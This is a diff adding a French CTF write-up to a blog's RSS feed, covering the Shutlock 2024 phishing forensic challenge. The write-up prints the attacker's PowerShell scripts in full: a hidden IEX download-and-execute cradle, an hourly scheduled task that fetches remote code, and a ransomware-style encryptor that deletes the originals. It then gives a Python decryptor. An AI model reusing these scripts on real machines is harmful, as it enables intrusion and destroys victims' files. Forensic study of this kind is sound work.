@@ -6,8 +6,529 @@
 		<generator>Hugo -- gohugo.io</generator>
 		<language>fr</language>
 		<copyright>CC BY-NC 4.0</copyright>
-		<lastBuildDate>Mon, 08 Jul 2024 16:04:20 +0200</lastBuildDate>
+		<lastBuildDate>Fri, 12 Jul 2024 09:16:24 +0200</lastBuildDate>
 		<atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
+		
+		<item>
+			<title>Shutlock 2024 - Enquête sur le phishing des JO : Retracer l&#39;attaque 2/2</title>
+			<link>http://localhost:1313/posts/shutlock2024_phishing_2-2/shutlock2024_phishing_2-2/</link>
+			<pubDate>Fri, 12 Jul 2024 09:16:24 +0200</pubDate>
+			
+			<guid>http://localhost:1313/posts/shutlock2024_phishing_2-2/shutlock2024_phishing_2-2/</guid>
+			<description><![CDATA[%!s(<nil>)]]></description>
+			<content type="html"><![CDATA[<div>
+  <img src="/posts/shutlock2024_phishing_2-2/images/shutlock.png" alt="Logo_Shutlock">
+</div>
+<p>Ceci est le write-up de la deuxième partie du challenge Forensic <strong>Enquête sur le phishing des JO</strong> du CTF <a href="https://shutlock.fr/">Shutlock</a> édition 2024 organisé par la DGSI et EPITA.</p>
+<h2 id="énoncé">Énoncé</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Bravo !
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Vous voici dans la deuxième partie de votre enquête. Le dump réseau vous a été confié avec une partie de son système de fichiers.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">L&#39;utilisatrice à qui appartiennent ces informations, est une scientifique qui travaille sur le chiffrement du système d&#39;information des JO.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Aidez-la à déchiffrer son système de fichiers.
+</span></span></code></pre></div><p>Dans cette deuxième partie, on nous donne un fichier de capture réseau <strong>Capture.pcapng</strong> ainsi qu&rsquo;un dossier <strong>FileSystem</strong> qui correspond à une partie du système de fichier de l&rsquo;utilisatrice.</p>
+<p>Cette fois, nous ne sommes pas aussi guidé, on sait juste que le système a été chiffré et que l&rsquo;ont doit le déchiffrer.</p>
+<hr>
+<h2 id="investigation">Investigation</h2>
+<h3 id="système-de-fichier">Système de fichier</h3>
+<p>La première chose que j&rsquo;ai fait a été de parcourir le dossier <strong>FileSystem</strong> afin d&rsquo;essayer de trouver une piste.</p>
+<p>En me rendant dans dans les dossier personnels de l&rsquo;utilisatrice (<strong>Desktop</strong>, <strong>Documents</strong> et <strong>Downloads</strong>), je me suis rendu compte que des objets portent l&rsquo;extension <code>.shutlock</code>, notamment un objet <strong>importante_recherche.shutlock</strong>. Les ouvrir ne sert à rien car il n&rsquo;y a rien de lisible, on a surement trouvé les fichiers chiffrés.</p>
+<p>On peut également remarquer un fichier nommé <strong>iv</strong> dans le dossier Documents, il n&rsquo;a rien à faire la et on peut supposer qu&rsquo;il à servit au chiffrement des données, on le met donc de côté.</p>
+<p>On à également un dossier <strong>AppData</strong> mais rien n&rsquo;a l&rsquo;air intéressant de prime abord, on y reviendra suremment plus tard.</p>
+<p>Après avoir fait le tour du dossier, on peut aller voir du côté de la capture réseau.</p>
+<h3 id="capture-réseau">Capture réseau</h3>
+<p>Afin d&rsquo;analyser cette capture, on ouvre le fichier avec <a href="https://www.wireshark.org/">Wireshark</a> (ou <a href="https://www.wireshark.org/docs/man-pages/tshark.html">Tshark</a> pour la version CLI), on se rend alors compte que le fichier est très gros et que chercher &ldquo;a la main&rdquo; n&rsquo;est pas la solution la plus efficace.</p>
+<p>Afin de dégrossire tout ça, on va chercher à identifier l&rsquo;adresse du PC en lister les adresses privées, pour ça il faut se rendre dans <code>Statistiques &gt; Points de terminaison &gt; IPV4</code>.</p>
+<p>On trouve alors deux adresses IP privées, la <strong>192.168.1.1</strong> et la <strong>10.0.2.15</strong>.</p>
+<p>On peut revenir sur la capture et filtrer les résultats pour avoir l&rsquo;une ou l&rsquo;autre des adresses: <code>ip.addr==192.168.1.1 || ip.addr==10.0.2.15</code>.</p>
+<p>Bien que cela ait dégrossi, il rest encore beaucoup d&rsquo;entrées, on remarque également qu&rsquo;il y a beaucoup de requêtes TCP, on peut alors aller regarder les protocoles présents en se rendant dans <code>Statistiques &gt; Hiérarchie des Protocoles</code>.</p>
+<p>Le tableau qui s&rsquo;affiche nous apprend qu&rsquo;il y a en plus TLS et DNS, il y a du HTTP et qu&rsquo;il comprend lui même des fichiers JPEG, du texte, etc. C&rsquo;est notre piste.</p>
+<p>Afin de voir les fichiers échangés en HTTP, il faut se rendre dans <code>Fichier &gt; Exporter Objets &gt; HTTP...</code> et regrouper les adresses IPs d&rsquo;un côté et les noms d&rsquo;hôtes de l&rsquo;autre en cliquant sur &ldquo;Organiser par nom d&rsquo;hôte&rdquo; en haut.</p>
+<p>On peut voir que plusieurs fichiers ont été échangés avec l&rsquo;IP <strong>172.21.195.17</strong>, soit:</p>
+<ul>
+<li><strong>Enigma.ps1</strong></li>
+<li><strong>Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf</strong></li>
+<li><strong>Encrypt.ps1</strong></li>
+<li><strong>key.txt</strong></li>
+<li><strong>wallpaper.jpg</strong></li>
+</ul>
+<p>Les plus intéressants sont Enigma.ps1, Encrypt.ps1 et key.txt, on les téléchargent.</p>
+<h3 id="analyse-des-scripts">Analyse des scripts</h3>
+<p>Ces scripts powershell sont très certainement ceux qui ont été utilisés pour chiffrer le PC, on va donc essayer de comprendre ce qu&rsquo;ils font.</p>
+<h4 id="enigmaps1">Enigma.ps1</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="nv">$IP_addr</span> <span class="p">=</span> <span class="s1">&#39;172.21.195.17:5000&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$urlFakeJob</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$urlTask</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/GetFileInfo.ps1&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$fakePlaceOffer</span> <span class="p">=</span> <span class="s1">&#39;Tirage_au_sort_pour_gagner_des_places_aux_Jeux_Olympiques_de_Paris_2024.pdf&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$TaskFile</span> <span class="p">=</span> <span class="s1">&#39;GetFilesInfo.ps1&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Get the lure pdf</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$urlFakeJob</span> <span class="n">-OutFile</span> <span class="nv">$fakePlaceOffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Open the PDF file with the default PDF viewer</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="nv">$fakePlaceOffer</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">### Schedule task</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$taskName</span> <span class="p">=</span> <span class="s2">&#34;IGotYourFileInfo&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Create the scheduled task that get some file information</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="p">=</span> <span class="s2">&#34;Invoke-WebRequest -Uri </span><span class="nv">$urlTask</span><span class="s2"> -OutFile </span><span class="nv">$TaskFile</span><span class="s2"> ; Start-Process -FilePath </span><span class="nv">$TaskFile</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">schtasks</span> <span class="p">/</span><span class="n">create</span> <span class="p">/</span><span class="n">tn</span> <span class="nv">$taskName</span> <span class="p">/</span><span class="nb">sc </span><span class="n">HOURLY</span> <span class="p">/</span><span class="n">tr</span> <span class="nv">$cmd</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">#Encrypt some file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-WindowStyle</span> <span class="n">hidden</span> <span class="n">-ExecutionPolicy</span> <span class="n">Bypass</span> <span class="n">-nologo</span> <span class="n">-noprofile</span>  <span class="n">-c</span> <span class="s2">&#34;&amp; {IEX ((New-Object Net.WebClient).DownloadString(&#39;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/Encrypt.ps1&#39;))}&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Change wallpaper</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$webClient</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Net</span><span class="p">.</span><span class="py">WebClient</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperUrl</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/wallpaper.jpg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperPath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\wallpaper.jpg&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$webClient</span><span class="p">.</span><span class="py">DownloadFile</span><span class="p">(</span><span class="nv">$wallpaperUrl</span><span class="p">,</span> <span class="nv">$wallpaperPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Set the wallpaper</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$regKey</span> <span class="p">=</span> <span class="s2">&#34;HKCU:\Control Panel\Desktop&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">Wallpaper</span> <span class="n">-Value</span> <span class="nv">$wallpaperPath</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$wallpaperStyle</span> <span class="p">=</span> <span class="s2">&#34;3&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">WallpaperStyle</span> <span class="n">-Value</span> <span class="nv">$wallpaperStyle</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$tileWallpaper</span> <span class="p">=</span> <span class="s2">&#34;0&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$regKey</span> <span class="n">-Name</span> <span class="n">TileWallpaper</span> <span class="n">-Value</span> <span class="nv">$tileWallpaper</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Forcer l&#39;actualisation du bureau</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&#34;RUNDLL32.EXE&#34;</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;USER32.DLL,UpdatePerUserSystemParameters ,1 ,True&#34;</span> <span class="n">-Wait</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c">## Create text file</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$fileContent</span> <span class="p">=</span> <span class="s2">&#34;YOU HAVE BEEN INFECTED BY THE HAMOR FIND THE KEY TO RETREIVE YOUR FILE&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\instructions.txt&#34;</span> <span class="n">-Value</span> <span class="nv">$fileContent</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Open text file</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Invoke-Item</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Desktop\instructions.txt&#34;</span>
+</span></span></code></pre></div><p>Ce script est celui qui a très certainement été lancé en premier, il va créer la tâche planifiée vu avant, chiffrer les fichiers, changer le fond d&rsquo;écran et créer le fichier instructions.txt.</p>
+<p>La seule ligne qui nous intéresse pour déchiffrer les fichier est celle la:
+<code>powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c &quot;&amp; {IEX ((New-Object Net.WebClient).DownloadString('http://$IP_addr/Holmes/Encrypt.ps1'))}&quot;</code></p>
+<p>Elle appelle le script <strong>Encrypt.ps1</strong> qui est en charge de chiffrer les fichiers.</p>
+<h4 id="encryptps1">Encrypt.ps1</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ps1" data-lang="ps1"><span class="line"><span class="cl"><span class="c"># Define the directories to search for files</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$IP_addr</span> <span class="p">=</span> <span class="s1">&#39;172.21.195.17:5000&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$directories</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Define the file extensions to encrypt</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$extensions</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="s2">&#34;.png&#34;</span><span class="p">,</span> <span class="s2">&#34;.doc&#34;</span><span class="p">,</span> <span class="s2">&#34;.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;.zip&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyUrl</span> <span class="p">=</span> <span class="s2">&#34;http://</span><span class="nv">$IP_addr</span><span class="s2">/Holmes/key.txt&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Download the key from the URL</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyContent64</span> <span class="p">=</span> <span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="nv">$keyUrl</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">Content</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$keyContent</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetString</span><span class="p">([</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$keyContent64</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Use SHA-256 hash function to produce a 32-byte key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sha256</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.SHA256</span><span class="p">]::</span><span class="n">Create</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$sha256</span><span class="p">.</span><span class="py">ComputeHash</span><span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8</span><span class="p">.</span><span class="py">GetBytes</span><span class="p">(</span><span class="nv">$keyContent</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$iv</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.RijndaelManaged</span><span class="p">]::</span><span class="n">Create</span><span class="p">().</span><span class="py">IV</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Sauvegarder l&#39;IV dans un fichier</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ivFilePath</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:USERPROFILE</span><span class="s2">\Documents\iv&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$ivFilePath</span><span class="p">,</span> <span class="nv">$iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Create a new RijndaelManaged object with the specified key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="py">Security</span><span class="p">.</span><span class="py">Cryptography</span><span class="p">.</span><span class="py">RijndaelManaged</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Key</span> <span class="p">=</span> <span class="nv">$key</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">IV</span> <span class="p">=</span> <span class="nv">$iv</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Mode</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.CipherMode</span><span class="p">]::</span><span class="n">CBC</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$rijndael</span><span class="p">.</span><span class="py">Padding</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.PaddingMode</span><span class="p">]::</span><span class="n">PKCS7</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># Go through each directory</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$dir</span> <span class="k">in</span> <span class="nv">$directories</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c"># Go through each file</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="nv">$dir</span> <span class="n">-Recurse</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c"># Check the file extension</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$extensions</span> <span class="o">-contains</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c"># Generate the new file name</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$newName</span> <span class="p">=</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FullName</span> <span class="o">-replace</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span><span class="p">,</span> <span class="s2">&#34;.shutlock&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Read the file contents in bytes</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$contentBytes</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Create a new encryptor</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$encryptor</span> <span class="p">=</span> <span class="nv">$rijndael</span><span class="p">.</span><span class="py">CreateEncryptor</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Encrypt the content</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$encryptedBytes</span> <span class="p">=</span> <span class="nv">$encryptor</span><span class="p">.</span><span class="py">TransformFinalBlock</span><span class="p">(</span><span class="nv">$contentBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">,</span> <span class="nv">$contentBytes</span><span class="p">.</span><span class="n">Length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Write the encrypted content to a file</span>
+</span></span><span class="line"><span class="cl">            <span class="p">[</span><span class="no">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$newName</span><span class="p">,</span> <span class="nv">$encryptedBytes</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c"># Delete the original file</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">Remove-Item</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FullName</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Grâce aux commentaires, on comprend sans lire le code, a peu près ce qu&rsquo;il fait:</p>
+<ul>
+<li>Définis les extensions à cibler</li>
+<li>Récupère la clé et la hash via SHA-256</li>
+<li>Créé l&rsquo;iv et le sauvegarde dans un fichier</li>
+<li>Créé un objet <strong>RijndaelManaged</strong></li>
+<li>Chiffre les fichiers de manière récursive</li>
+</ul>
+<p>Maintenant que l&rsquo;ont sait ça, on a besoin de savoir (même si on peut s&rsquo;en douter) quel méthode de chiffrement a été utilisé, on cherche alors ce qu&rsquo;est l&rsquo;objet <strong>RijndaelManaged</strong> en Powershell et on tombe sur cet <a href="https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.rijndael?view=net-8.0">article</a> qui nous explique que c&rsquo;est, grosso modo, de l&rsquo;<strong>AES</strong>.</p>
+<p>L&rsquo;AES étant un algorithme de chiffrement symétrique, la clé de chiffrement est la même que celle de déchiffrement, ont a alors tout ce qu&rsquo;il faut pour déchiffrer les fichiers.</p>
+<h3 id="déchiffrement-des-fichiers">Déchiffrement des fichiers</h3>
+<p>Afin de déchiffrer les fichiers, j&rsquo;ai écrit le script en Python suivant:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hashlib</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">path_iv</span><span class="p">,</span><span class="n">path_key</span><span class="p">,</span><span class="n">file</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path_iv</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">b64_key</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">path_key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">b64_key</span><span class="p">))</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc_file</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span><span class="s2">&#34;rb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dec_file</span><span class="o">=</span><span class="n">unpad</span><span class="p">(</span><span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc_file</span><span class="p">),</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">file</span><span class="si">}</span><span class="s2">.dec&#34;</span><span class="p">,</span><span class="s2">&#34;wb&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dec_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">file</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">iv</span> <span class="o">=</span> <span class="s2">&#34;path/to/iv&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;path/to/key&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">decrypt</span><span class="p">(</span><span class="n">iv</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">file</span><span class="p">)</span>
+</span></span></code></pre></div><p>Il va permettre de déchiffrer le fichier en argument et lui rajouter l&rsquo;extension <strong>.dec</strong>.</p>
+<p>J&rsquo;utilise ce script pour déchiffrer (au hasard) l&rsquo;objet <strong>importante_recherche.shutlock</strong> et pour savoir quel est l&rsquo;extension du fichier déchiffrer, on peut tout simplement utiliser la commande <strong>file</strong> sous Linux (ou a la main en regardant le <strong>Magic Byte</strong>):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">file importante_recherche.shutlock.dec
+</span></span><span class="line"><span class="cl">importante_recherche.shutlock.dec: Zip archive data, at least v5.1 to extract, compression method=AES Encrypted
+</span></span></code></pre></div><p>On a donc un <strong>.zip</strong>, la partie <strong>compression method=AES Encrypted</strong> nous indique qu&rsquo;il est protégé par un mot de passe, que nous allons devoir trouver.</p>
+
+    <aside class="admonition note">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-edit-2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"></path></svg></div><b>Note</b>
+        </div>
+        <div class="admonition-content">Il existe une technique permettant de craquer une archive chiffrée (très bien expliqué dans cet <a href="https://www.acceis.fr/craquage-darchives-chiffrees-pkzip-zip-zipcrypto-winzip-zip-aes-7-zip-rar/">article</a>) mais cela fonctionne uniquement quand l&rsquo;archive est chiffrée avec <strong>ZipCrypto</strong>, ce qui n&rsquo;est pas nôtre cas ici.</div>
+    </aside>
+<p>J&rsquo;ai déchiffré tous les autres fichiers mais ils ne contiennent rien d&rsquo;important.</p>
+<h3 id="mot-de-passe-de-larchive">Mot de passe de l&rsquo;archive</h3>
+<p>Le système de fichier est déchiffré mais pourtant pas de flag en vue et une archive protégée par mot de passe, la suite logique est alors de la déchiffrer !</p>
+<p>Malheureusement, l&rsquo;archive ne nous fournir aucune piste sur ou chercher et, comme je le disais au dessus, aucun autre fichier dans le répertoire personnel de l&rsquo;utilisatrice n&rsquo;a d&rsquo;importance (on a une image de canard ainsi que des fichiers remplis de données aléatoire). Le seul endroit ou on n&rsquo;a pas encore regardé est le dossier <strong>AppData</strong>.</p>
+<p>Ce dossier contient les fichiers de paramètres ainsi que pleins d&rsquo;autres informations utilisées par les applications installées sur le système.</p>
+
+    <aside class="admonition warning">
+        <div class="admonition-title">
+            <div class="icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-alert-circle"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg></div><b>Avertissement</b>
+        </div>
+        <div class="admonition-content"><p>La résolution ci-dessous est-ce celle que j&rsquo;ai eu pendant le CTF.</p>
+<p>J&rsquo;ai fonctionné à taton avant de trouver ça, d&rsquo;autres chemins plus &ldquo;cadrés&rdquo; étaient possibles.</p>
+</div>
+    </aside>
+<p>Dans ce dossier, il était possible de regarder à beaucoup d&rsquo;endroits, mais un a pu me faire avance, il s&rsquo;agit de <strong>ActivitiesCache.db</strong>.</p>
